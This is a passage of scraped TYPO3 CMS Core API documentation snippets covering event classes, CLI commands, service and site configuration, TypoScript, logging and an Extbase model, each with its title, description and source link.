https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/EnrichFileMetaDataEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass EnrichFileMetaDataEvent\n{\n    public function getFileUid(): int;\n    \n    public function getMetaDataUid(): int;\n    \n    public function getRecord(): array;\n    \n    public function setRecord(array $record);\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving File UID in AfterFileMetaDataCreatedEvent in PHP\nDESCRIPTION: Method to get the unique identifier of the file whose metadata was created. Returns an integer representing the file UID in the database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileMetaDataCreatedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function getFileUid(): int\n```\n\n----------------------------------------\n\nTITLE: Listing Sites using TYPO3 CLI - Legacy Installation\nDESCRIPTION: Command to list all configured TYPO3 sites including their identifier, root page, base URL, languages, locales and enabled status using Legacy installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/CliTools.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 site:list\n```\n\n----------------------------------------\n\nTITLE: Listing Installed TYPO3 Extensions with Composer\nDESCRIPTION: Command to display all installed extensions with their current version numbers\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/UpgradingExtensions/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncomposer info\n```\n\n----------------------------------------\n\nTITLE: Using the IntrospectionProcessor in TYPO3 logging\nDESCRIPTION: The IntrospectionProcessor can be used to add stack trace information to the data property of a LogRecord. This example shows the fully-qualified class name of this processor.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Model/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Log\\Processor\\IntrospectionProcessor\n```\n\n----------------------------------------\n\nTITLE: ModifyRecordListHeaderColumnsEvent Class Definition\nDESCRIPTION: PHP class that provides methods to modify header columns in the TYPO3 RecordList. Includes methods for adding, removing, and modifying columns, as well as managing header attributes and accessing record information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListHeaderColumnsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\RecordList\\Event;\n\nclass ModifyRecordListHeaderColumnsEvent {\n    public function setColumn(string $column, string $columnName = '');\n    public function hasColumn(string $columnName): bool;\n    public function getColumn(string $columnName): ?string;\n    public function removeColumn(string $columnName): bool;\n    public function setColumns(array $columns);\n    public function getColumns(): array;\n    public function setHeaderAttributes(array $headerAttributes);\n    public function getHeaderAttributes(): array;\n    public function getTable(): string;\n    public function getRecordIds(): array;\n    public function getRecordList(): \\TYPO3\\CMS\\Backend\\RecordList\\DatabaseRecordList;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Record Links for Haiku Module in TYPO3 TypoScript\nDESCRIPTION: Defines the record link configuration for a Haiku module, setting link generation parameters and handling. The configuration specifies link behavior for hidden records and constructs URL parameters for showing individual Haiku records using typolink.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/LinkBrowser/Classes/HaikuRecordLinkTypoScript.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.recordLinks.haiku {\n   // Do not force link generation when the record is hidden\n   forceLink = 0\n\n   typolink {\n      parameter = {$plugin.tx_examples_haiku.settings.singlePid}\n      additionalParams.data = field:uid\n      additionalParams.wrap = &tx_examples_haiku[action]=show&tx_examples_haiku[haiku]=|\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Cache Service in TYPO3 YAML\nDESCRIPTION: Service configuration for cache dependency injection in Services.yaml.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Developer/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  cache.myext_mycache:\n    class: TYPO3\\CMS\\Core\\Cache\\Frontend\\FrontendInterface\n    factory: ['@TYPO3\\CMS\\Core\\Cache\\CacheManager', 'getCache']\n    arguments:\n      - 'myext_mycache'\n```\n\n----------------------------------------\n\nTITLE: Implementing a TYPO3 Backend Event Listener for AfterBackendPageRenderEvent in PHP\nDESCRIPTION: This snippet demonstrates how to create an event listener for the AfterBackendPageRenderEvent in TYPO3. The listener can modify the rendered backend page content before it's sent to the browser.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/AfterBackendPageRenderEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Controller\\Event\\AfterBackendPageRenderEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterBackendPageRenderEvent $event): void\n    {\n        $pageContent = $event->getPageContent();\n        // Do something with the page content\n        $event->setPageContent($pageContent);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Sample TYPO3 Log Output Format\nDESCRIPTION: Example of the default log output format produced by TYPO3's FileWriter. It shows the timestamp, log level, request ID, component name, and message content along with any context data in JSON format.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Quickstart/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: none\nCODE:\n```\nFri, 19 Jul 2023 09:45:00 +0100 [WARNING] request=\"5139a50bee3a1\" component=\"TYPO3.Examples.Controller.DefaultController\": Something went awry, check your configuration!\nFri, 19 Jul 2023 09:45:00 +0100 [ERROR] request=\"5139a50bee3a1\" component=\"TYPO3.Examples.Controller.DefaultController\": Passing someValue was unwise. - {\"value\":\"someValue\",\"other_data\":{}}\nFri, 19 Jul 2023 09:45:00 +0100 [CRITICAL] request=\"5139a50bee3a1\" component=\"TYPO3.Examples.Controller.DefaultController\": This is an utter failure!\n```\n\n----------------------------------------\n\nTITLE: Extbase Lazy Annotation Example\nDESCRIPTION: This code snippet demonstrates the usage of the `Lazy` annotation in Extbase. It marks a model property to be loaded lazily on first access, which can improve performance. The annotation is placed above the property definition in the model class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Annotations.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace TYPO3Documentation\\BlogExample\\Domain\\Model;\n\nuse TYPO3\\CMS\\Extbase\\Annotation as Extbase;\n\nclass Blog extends \\TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity\n{\n    /**\n     * @var string\n     */\n    protected $title = '';\n\n    /**\n     * @var string\n     */\n    protected $description = '';\n\n    /**\n     * @Extbase\\ORM\\Lazy\n     * @var \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Post>\n     * @TYPO3\\CMS\\Extbase\\Annotation\\ORM\\Cascade(\"remove\")\n     */\n    protected $posts = null;\n\n    /**\n     * __construct\n     */\n    public function __construct()\n    {\n        //Do not modify this method. It enables initialization of all ObjectStorage properties.\n        //See https://docs.typo3.org/typo3cms/ExtbaseFluidBook/6-Persistence/2-model-properties.html\n        $this->posts = new \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage();\n    }\n\n    /**\n     * Returns the title\n     *\n     * @return string $title\n     */\n    public function getTitle()\n    {\n        return $this->title;\n    }\n\n    /**\n     * Sets the title\n     *\n     * @param string $title\n     * @return void\n     */\n    public function setTitle(string $title)\n    {\n        $this->title = $title;\n    }\n\n    /**\n     * Returns the description\n     *\n     * @return string $description\n     */\n    public function getDescription()\n    {\n        return $this->description;\n    }\n\n    /**\n     * Sets the description\n     *\n     * @param string $description\n     * @return void\n     */\n    public function setDescription(string $description)\n    {\n        $this->description = $description;\n    }\n\n    /**\n     * Adds a Post\n     *\n     * @param Post $post\n     * @return void\n     */\n    public function addPost(Post $post)\n    {\n        $this->posts->attach($post);\n    }\n\n    /**\n     * Removes a Post\n     *\n     * @param Post $postToRemove The Post to be removed\n     * @return void\n     */\n    public function removePost(Post $postToRemove)\n    {\n        $this->posts->detach($postToRemove);\n    }\n\n    /**\n     * Returns the posts\n     *\n     * @return \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Post>\n     */\n    public function getPosts()\n    {\n        return $this->posts;\n    }\n\n    /**\n     * Sets the posts\n     *\n     * @param \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Post> $posts\n     * @return void\n     */\n    public function setPosts(\\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage $posts)\n    {\n        $this->posts = $posts;\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Unlocking TYPO3 Backend via CLI Command\nDESCRIPTION: Command to remove the LOCK_BACKEND flag file and restore backend access.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/MaintenanceMode/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 backend:unlock\n```\n\n----------------------------------------\n\nTITLE: Validating Values with ValidatorInterface in TYPO3 PHP\nDESCRIPTION: Core interface method for validating values in TYPO3 validators. Takes a mixed value parameter and returns a Result object containing any validation error messages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Api/ValidatorInterface.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nvalidate(mixed $value)\n```\n\n----------------------------------------\n\nTITLE: Copyright Notice Example in PHP\nDESCRIPTION: Illustrates the required copyright notice at the top of every TYPO3 PHP class file.  This notice includes information about the license (GNU General Public License version 2 or later) and a reference to the LICENSE.txt file. The wording of the copyright notice must not be changed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/FileStructure.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n    declare(strict_types = 1);\n\n    /*\n     * This file is part of the TYPO3 CMS project.\n     *\n     * It is free software; you can redistribute it and/or modify it under\n     * the terms of the GNU General Public License, either version 2\n     * of the License, or any later version.\n     *\n     * For the full copyright and license information, please read the\n     * LICENSE.txt file that was distributed with this source code.\n     *\n     * The TYPO3 project - inspiring people to share!\n     */\n\n     namespace Vendor\\SomeExtension\\SomeFolder;\n```\n\n----------------------------------------\n\nTITLE: Registering Upgrade Wizard in YAML Services Configuration\nDESCRIPTION: YAML configuration for registering an upgrade wizard in TYPO3 services configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/UpdateExtensions/UpdateWizards/Creation.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\Upgrades\\ExampleUpgradeWizard:\n    tags:\n      - name: install.upgradewizard\n```\n\n----------------------------------------\n\nTITLE: Disabling Cache in TYPO3 CMS Frontend\nDESCRIPTION: This method disables the Frontend caching mechanism. It can be called by extensions with custom middlewares. The method takes a reason parameter to explain why caching is being disabled. It's important to consider the middleware stack position when using this method due to potential performance impacts.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/CacheInstruction.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\npublic function disableCache(string $reason)\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Using currentValueKey in cObject ViewHelper\nDESCRIPTION: Shows how to use currentValueKey to specify which value should be available via current in TypoScript.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingTypoScriptCObjectViewHelper.rst#2025-04-16_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n{post -> f:cObject(typoscriptObjectPath: 'lib.myCounter', currentValueKey: 'viewCount')}\n```\n\n----------------------------------------\n\nTITLE: Defining Properties in Extbase Model Class for Tea\nDESCRIPTION: This snippet shows the property declarations for a Tea model class in Extbase. It defines various properties like title, description, and image with their types and annotations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Model.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nprotected string $title = '';\n\nprotected string $description = '';\n\n/**\n * @var \\TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference|null\n * @Lazy\n */\nprotected ?\\TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference $image = null;\n```\n\n----------------------------------------\n\nTITLE: Defining AfterTemplatesHaveBeenDeterminedEvent Class in TYPO3 CMS Core API (PHP)\nDESCRIPTION: This code snippet defines the AfterTemplatesHaveBeenDeterminedEvent class within the TYPO3\\CMS\\Core\\TypoScript\\IncludeTree\\Event namespace. The class includes methods for retrieving the rootline, request, site, and template rows, as well as setting template rows.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterTemplatesHaveBeenDeterminedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\TypoScript\\IncludeTree\\Event;\n\nclass AfterTemplatesHaveBeenDeterminedEvent\n{\n    public function getRootline(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getRequest(): ?\\Psr\\Http\\Message\\ServerRequestInterface\n    {\n        // Implementation not shown\n    }\n\n    public function getSite(): ?\\TYPO3\\CMS\\Core\\Site\\Entity\\SiteInterface\n    {\n        // Implementation not shown\n    }\n\n    public function getTemplateRows(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setTemplateRows(array $templateRows): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: XML Country Translation File - English\nDESCRIPTION: XML language file containing English translations for the custom country\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Country/BeforeCountriesEvaluatedEvent.rst#2025-04-16_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?>\n<xliff version=\"1.2\">\n    <file source-language=\"en\" datatype=\"plaintext\" original=\"messages\">\n        <header/>\n        <body>\n            <trans-unit id=\"XX\" resname=\"XX\">\n                <source>Magic Kingdom</source>\n            </trans-unit>\n        </body>\n    </file>\n</xliff>\n```\n\n----------------------------------------\n\nTITLE: Cache Flush Command Syntax for TYPO3 CLI\nDESCRIPTION: Command-line syntax for flushing specific cache groups in TYPO3. The command allows targeting specific cache groups or flushing all caches when no option is specified.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncache:flush [--group <all|system|di|pages|...>]\n```\n\n----------------------------------------\n\nTITLE: IsFileSelectableEvent Class Definition for TYPO3 File Browser\nDESCRIPTION: PHP class that defines an event interface for determining if files can be selected in the TYPO3 file browser. Includes methods for getting the file reference, checking selection status, and controlling file selection permissions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/IsFileSelectableEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\ElementBrowser\\Event;\n\nclass IsFileSelectableEvent\n{\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\FileInterface\n    {\n        // Returns the file object\n    }\n\n    public function isFileSelectable(): bool\n    {\n        // Returns whether the file can be selected\n    }\n\n    public function allowFileSelection()\n    {\n        // Allows file selection\n    }\n\n    public function denyFileSelection()\n    {\n        // Denies file selection\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling Global Driver Middleware for Specific Connection in TYPO3\nDESCRIPTION: Demonstrates how to disable a global Doctrine DBAL driver middleware for a specific database connection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Middleware/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['middlewares']['my-middleware'] = [\n    'disabled' => true,\n];\n```\n\n----------------------------------------\n\nTITLE: Example TYPO3 Project Composer Configuration\nDESCRIPTION: Sample composer.json file for a TYPO3 project before adding testing dependencies. It includes basic TYPO3 requirements and configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/ProjectTesting.rst#2025-04-16_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n..  literalinclude:: _ProjectTesting/_composer.json\n    :caption: Example project composer.json before testing\n```\n\n----------------------------------------\n\nTITLE: Creating Backend Controller with Legacy Installation\nDESCRIPTION: Command to create a new backend controller using TYPO3's legacy installation method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/BackendController.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 make:backendcontroller\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Site Base Variant Configuration\nDESCRIPTION: Demonstrates how to configure a base variant in TYPO3 site configuration using application context conditions. The example shows setting a development environment URL based on a specific context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/ApplicationContext/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nbaseVariants:\n-\n  base: 'https://dev-1.example.com/'\n  condition: 'applicationContext == \"Development/Dev1\"'\n```\n\n----------------------------------------\n\nTITLE: Installing composer-patches Package\nDESCRIPTION: Command to install the cweagans/composer-patches Composer package, which allows automatic application of patches to TYPO3 core files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/ApplyingCorePatches/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncomposer req cweagans/composer-patches\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterPagePreviewUriGeneratedEvent Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for the AfterPagePreviewUriGeneratedEvent. This listener allows modifying the preview URI after it has been generated by the PreviewUriBuilder.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/AfterPagePreviewUriGeneratedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Routing\\Event\\AfterPagePreviewUriGeneratedEvent;\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\n\nfinal class MyEventListener\n{\n    #[AsEventListener]\n    public function __invoke(AfterPagePreviewUriGeneratedEvent $event): void\n    {\n        // Get current URI\n        $uri = $event->getPreviewUri();\n\n        // Modify URI\n        $modifiedUri = $uri . '&my_parameter=my_value';\n\n        // Set modified URI\n        $event->setPreviewUri($modifiedUri);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Major TYPO3 Extension Upgrade\nDESCRIPTION: Command to upgrade a specific extension to a new major version by explicitly requiring the new version number\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/UpgradingExtensions/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncomposer require vendor/packagename:<new version>\n```\n\n----------------------------------------\n\nTITLE: Allowing Page ID Selector Option in RTE Configuration\nDESCRIPTION: This snippet demonstrates how to allow the pageIdSelector as a link option in the Rich Text Editor configuration. The configuration specifies the allowed options for links created in the RTE.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Configuration.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nallowedOptions: 'target,title,class,pageIdSelector'\n```\n\n----------------------------------------\n\nTITLE: Error Handling in DataHandler (PHP)\nDESCRIPTION: Shows how to handle errors that occur during DataHandler operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/UsingDataHandler/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\DataHandling\\DataHandler;\\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\\nuse TYPO3\\CMS\\Core\\Utility\\DebugUtility;\\n\\n$dataHandler = GeneralUtility::makeInstance(DataHandler::class);\\n$dataHandler->start($data, []);\\n$dataHandler->process_datamap();\\n\\nif (!empty($dataHandler->errorLog)) {\\n    DebugUtility::debug($dataHandler->errorLog);\\n}\n```\n\n----------------------------------------\n\nTITLE: Defining CacheWarmupEvent PHP Class Methods\nDESCRIPTION: PHP class definition for CacheWarmupEvent with methods for managing cache groups and error handling. The class provides functionality to check group existence, retrieve groups and errors, and add new error entries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Cache/CacheWarmupEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Cache\\Event;\n\nclass CacheWarmupEvent\n{\n    public function getGroups(): array\n    {\n        // Returns array of cache groups\n    }\n\n    public function hasGroup(string $group): bool\n    {\n        // Checks if specific group exists\n    }\n\n    public function getErrors(): array\n    {\n        // Returns array of errors\n    }\n\n    public function addError(string $error): void\n    {\n        // Adds an error to the collection\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Rendering RTE Content with Links in Fluid Template\nDESCRIPTION: This snippet demonstrates how to safely output RTE content containing links using the f:format.html ViewHelper in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<f:format.html>{myContent.bodytext}</f:format.html>\n```\n\n----------------------------------------\n\nTITLE: Locking TYPO3 Backend via CLI Command\nDESCRIPTION: Command to create a LOCK_BACKEND flag file that prevents backend access for all users while maintaining CLI functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/MaintenanceMode/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 backend:lock\n```\n\n----------------------------------------\n\nTITLE: Allowing Insecure Site Resolution by Query Parameters in TYPO3\nDESCRIPTION: Reactivates the previous behavior of resolving sites by 'id' and 'L' HTTP query parameters, which is denied by default for security reasons.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/SYS.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['features']['security.frontend.allowInsecureSiteResolutionByQueryParameters'] = true;\n```\n\n----------------------------------------\n\nTITLE: PHP Namespace Declaration for TYPO3 Frontend ContentObject Events\nDESCRIPTION: Declares the PHP namespace for TYPO3 Frontend ContentObject Events\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterImageResourceResolvedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\ContentObject\\Event;\n```\n\n----------------------------------------\n\nTITLE: Configuring CLI Command with Arguments and Options in TYPO3 PHP\nDESCRIPTION: This code snippet defines a CreateWizardCommand class that extends Symfony's Command class. It configures the command with an optional 'wizardName' argument and a 'brute-force' option. The command is set up to provide help text and accept specific inputs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Command/Classes/CreateWizardCommandConfiguration.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Symfony\\Component\\Console\\Input\\InputArgument;\nuse Symfony\\Component\\Console\\Input\\InputOption;\n\nfinal class CreateWizardCommand extends Command\n{\n    protected function configure(): void\n    {\n        $this\n            ->setHelp('This command accepts arguments')\n            ->addArgument(\n                'wizardName',\n                InputArgument::OPTIONAL,\n                'The wizard\\'s name',\n            )\n            ->addOption(\n                'brute-force',\n                'b',\n                InputOption::VALUE_NONE,\n                'Allow the \"Wizard of Oz\". You can use --brute-force or -b when running command',\n            );\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Crowdin YAML for TYPO3 Extension\nDESCRIPTION: Example .crowdin.yml configuration to exclude existing translations from being shown as source files in Crowdin.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Crowdin/Faq.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nfiles:\n  - source: /Resources/Private/Language/\n    translation: /Resources/Private/Language/%two_letters_code%.%original_file_name%\n    ignore:\n      - /Resources/Private/Language/de.*\n```\n\n----------------------------------------\n\nTITLE: Backend User Management via BE_USER in TYPO3\nDESCRIPTION: BE_USER handles backend user authentication and is managed through the `Bootstrap::initializeBackendUser()` method. It is critical for managing user sessions and permissions in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/GlobalVariables.rst#2025-04-16_snippet_6\n\n\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Application Context in Nginx\nDESCRIPTION: Nginx configuration example showing how to pass the TYPO3 application context as a FastCGI parameter for PHP processing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Bootstrapping.rst#2025-04-16_snippet_3\n\nLANGUAGE: nginx\nCODE:\n```\n# In your Nginx configuration, you can pass the context as a fastcgi parameter\nlocation ~ \\.php$ {\n   include         fastcgi_params;\n   fastcgi_index   index.php;\n   fastcgi_param   TYPO3_CONTEXT  Development/Dev;\n   fastcgi_param   SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n}\n```\n\n----------------------------------------\n\nTITLE: Including RST Directives for RequireJS Documentation\nDESCRIPTION: RST directives for setting up the documentation page structure, including index entries and file includes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/RequireJS/Extensions/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n:orphan:\n\n..  include:: /Includes.rst.txt\n..  index:: pair: Extensions; RequireJS\n..  _requirejs-extensions:\n```\n\n----------------------------------------\n\nTITLE: Referencing README Path in TYPO3 Extensions using reStructuredText\nDESCRIPTION: This snippet shows how to reference the path to a README file in a TYPO3 extension using the reStructuredText syntax. It uses the file directive to format the path correctly.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Documentation.rst#2025-04-16_snippet_2\n\nLANGUAGE: restructuredtext\nCODE:\n```\n:file:`EXT:{extkey}/README.rst`\n```\n\n----------------------------------------\n\nTITLE: AfterFileAddedEvent API in TYPO3 CMS PHP\nDESCRIPTION: This code shows the API of the AfterFileAddedEvent class which provides methods to access the newly added file, the folder it was added to, and the original file data. The event is triggered after a file has been added to the TYPO3 resource storage.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileAddedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nfinal class AfterFileAddedEvent\n{\n    public function __construct(\n        private readonly FileInterface $file,\n        private readonly FolderInterface $folder,\n        private readonly ?string $originalFilePath = null\n    ) {\n    }\n\n    public function getFile(): FileInterface\n    {\n        return $this->file;\n    }\n\n    public function getFolder(): FolderInterface\n    {\n        return $this->folder;\n    }\n\n    public function getOriginalFilePath(): ?string\n    {\n        return $this->originalFilePath;\n    